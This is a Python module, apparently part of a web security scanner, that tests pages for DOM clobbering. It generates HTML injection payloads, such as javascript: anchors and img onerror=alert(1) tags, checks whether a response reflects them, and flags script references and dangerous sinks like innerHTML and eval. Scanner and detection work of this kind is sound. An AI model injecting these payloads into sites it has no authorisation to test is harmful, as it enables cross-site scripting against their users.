"""DOM clobbering detection.

DOM clobbering is a class of XSS where an attacker injects HTML elements
with `id` or `name` attributes that shadow globals (window.x), named form
elements (document.forms.x), or collections.  When client-side JS later
references these via `x`, `document.x`, or `someForm.fieldName`, the
clobbered element is used instead, frequently reaching sinks like
`.innerHTML`, `.href`, `.src`, or `location` setters.

Examples:
  <img id=x name=x><script>document.getElementById('x').src=...</script>
  <form id=x><input name=action></form>  -> x.action is now the input
  <a id=x href="javascript:alert(1)">    -> window.x.location assign

This module:
  1. Generates clobbering payloads with high-yield id/name pairs.
  2. Detects whether the response reflected them as HTML attributes.
  3. Scans the page's <script> tags for JS that references the clobbered
     identifiers via property access -- if so, the clobber is exploitable.
"""
from __future__ import annotations
import re

# High-yield clobber targets: globals/properties that client JS commonly
# accesses via shorthand (`x` instead of `document.getElementById('x')`).
# Each entry: (id_name, payload_template, sink_pattern)
# payload_template uses {TOKEN} so the scanner can mark each injection.
CLOBBER_TARGETS: list[tuple[str, str, str]] = [
    # window.x / global x -> anchor with javascript: URL
    ("x",  '<a id={TOKEN} href="javascript:alert(1)">x</a>',
     r'\b{TOKEN}\b'),
    # window.location mutation via named anchor
    ("location", '<a id=location href="javascript:alert(1)">x</a>',
     r'location\s*[.\[]'),
    # document.x shadowing
    ("x",  '<img id={TOKEN} name={TOKEN} src=x onerror=alert(1)>',
     r'document\.{TOKEN}\b'),
    # form.action clobber (very common in legacy apps)
    ("action", '<form id=x><input name=action value="javascript:alert(1)"></form>',
     r'\.action\b'),
    # forms.namedItem clobber
    ("x", '<form id={TOKEN}><input name={TOKEN}></form>',
     r'forms\[\s*[\'"]{TOKEN}[\'"]\s*\]'),
    # window.name as data carrier (read by JS, often used as innerHTML sink)
    ("name", '<a id=x name={TOKEN}>x</a>',
     r'window\.name'),
    # cookie shadowing (rare but real)
    ("cookie", '<a id=cookie href="javascript:alert(1)">x</a>',
     r'\.cookie\b'),
    # getElementById chain -- if id is clobbered, getElementById returns
    # the attacker element instead of expected one
    ("x", '<img id={TOKEN} src=x onerror=alert(1)>',
     r'getElementById\(\s*[\'"]{TOKEN}[\'"]\s*\)'),
    # querySelector clobber via `[id=x]`
    ("x", '<img id={TOKEN} src=x onerror=alert(1)>',
     r'querySelector\(\s*[\'"]#\s*{TOKEN}[\'"]\s*\)'),
    # dataset clobber
    ("x", '<img id={TOKEN} data-x="javascript:alert(1)">',
     r'\.dataset\.'),
]

# JS sink patterns that read DOM globals and pass them to dangerous sinks.
# The [\+\-\*\/]? prefix catches compound assignment (+=, -=, etc.) so
# `innerHTML += value` is also detected as a danger sink.
DANGER_SINK_RE = re.compile(
    r'\.innerHTML\s*[\+\-\*\/]?=|\.outerHTML\s*[\+\-\*\/]?=|insertAdjacentHTML\(|'
    r'document\.write\(|document\.writeln\(|'
    r'eval\(|setTimeout\(\s*[^,)]*[a-zA-Z]|setInterval\(\s*[^,)]*[a-zA-Z]|'
    r'\.src\s*[\+\-\*\/]?=|\.href\s*[\+\-\*\/]?=|\.action\s*[\+\-\*\/]?=|'
    r'location\s*[\+\-\*\/]?=|location\.href\s*[\+\-\*\/]?=',
    re.IGNORECASE,
)


def payloads(token: str = "x") -> list[str]:
    """Return all clobbering payloads with the given id/name token."""
    seen = set()
    out = []
    for _, tmpl, _ in CLOBBER_TARGETS:
        p = tmpl.replace("{TOKEN}", token)
        if p not in seen:
            seen.add(p)
            out.append(p)
    return out


def detect_reflection(response_text: str, token: str) -> bool:
    """Check whether any clobber payload with this token was reflected."""
    if not response_text or not token:
        return False
    # Look for id=token or name=token as an HTML attribute.
    pat = re.compile(
        r'(?:id|name)\s*=\s*[\'"]?\s*' + re.escape(token) + r'\b',
        re.IGNORECASE,
    )
    return bool(pat.search(response_text))


def find_clobbered_js_refs(response_text: str, token: str) -> list[str]:
    """Find JS references to the clobbered identifier.

    Returns a list of matching JS snippets (truncated) that reference the
    token via property access -- these are the code paths that will receive
    the attacker-controlled clobber value.
    """
    if not response_text or not token:
        return []
    refs = []
    # Look in <script> blocks for property access patterns referencing token.
    for m in re.finditer(r'<script[^>]*>(.*?)</script>',
                         response_text, re.IGNORECASE | re.DOTALL):
        script = m.group(1)
        # Search for token as an identifier in the script.
        for ref in re.finditer(
            r'(?:document|window|forms|this)\.\s*' + re.escape(token) + r'\b'
            r'|'
            + re.escape(token) + r'\s*[\.\[]',
            script,
        ):
            snippet = script[max(0, ref.start() - 20):
                             min(len(script), ref.end() + 40)]
            refs.append(snippet.strip())
        # getElementById('token') / querySelector('#token')
        for ref in re.finditer(
            r'getElementById\(\s*[\'"]' + re.escape(token) + r'[\'"]\s*\)'
            r'|querySelector\(\s*[\'"]#' + re.escape(token) + r'[\'"]\s*\)',
            script,
        ):
            snippet = script[max(0, ref.start() - 20):
                             min(len(script), ref.end() + 40)]
            refs.append(snippet.strip())
    return refs


def has_danger_sink(response_text: str) -> bool:
    """Whether the page contains any JS sink that consumes DOM globals."""
    return bool(DANGER_SINK_RE.search(response_text or ""))


def analyze(response_text: str, token: str) -> dict:
    """Full clobber analysis of a single response.

    Returns: {
        "reflected":   bool,        # clobber attribute reflected
        "js_refs":     list[str],   # JS references to the clobbered id
        "danger_sink": bool,        # a JS sink that consumes globals exists
        "exploitable": bool,        # reflected AND a JS ref AND a sink
        "token":       str,
    }
    """
    reflected = detect_reflection(response_text, token)
    js_refs = find_clobbered_js_refs(response_text, token)
    danger = has_danger_sink(response_text)
    return {
        "reflected": reflected,
        "js_refs": js_refs,
        "danger_sink": danger,
        "exploitable": reflected and bool(js_refs) and danger,
        "token": token,
    }
